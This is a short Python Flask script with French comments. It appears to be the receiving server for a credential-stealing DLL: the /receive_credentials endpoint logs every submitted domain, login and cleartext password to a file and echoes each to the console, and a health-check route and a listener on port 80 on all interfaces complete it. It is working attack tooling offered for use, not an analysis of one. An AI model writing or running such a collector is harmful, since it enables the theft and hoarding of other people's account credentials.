from flask import Flask, request
import logging
from datetime import datetime

app = Flask(__name__)

# Configuration du logging
logging.basicConfig(filename='requests.log', level=logging.INFO, 
                    format='%(asctime)s - %(message)s', datefmt='%d-%b-%y %H:%M:%S')

# aficher sur le shell de façon dynamique
PRINT_TO_CONSOLE = True

# Code couleur
GREEN = '\033[92m'
RESET = '\033[0m'

def log_request(req):
    timestamp = datetime.now().strftime("%d-%b-%y %H:%M:%S")
    log_message = f"[+] {timestamp} - Domain: {req.form.get('domain', 'None')}, Login: {req.form.get('login', 'None')}, Password: {req.form.get('password', 'None')}"
    
    # enregistrement dans un fichier
    logging.info(log_message)
    
    # Affichage dans le shell si activé
    if PRINT_TO_CONSOLE:
        print(f"{GREEN}{log_message}{RESET}")

# Méthode de contact de la dll avec le serveur
@app.route('/receive_credentials', methods=['POST'])
def receive_credentials():
    log_request(request)
    return "OK", 200

# Permet de check la disponibilité du serveur Flask
@app.route('/health', methods=['GET'])
def health_check():
    return "Healthy", 200

# Ecoute sur toutes les interfaces sur le port 80
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
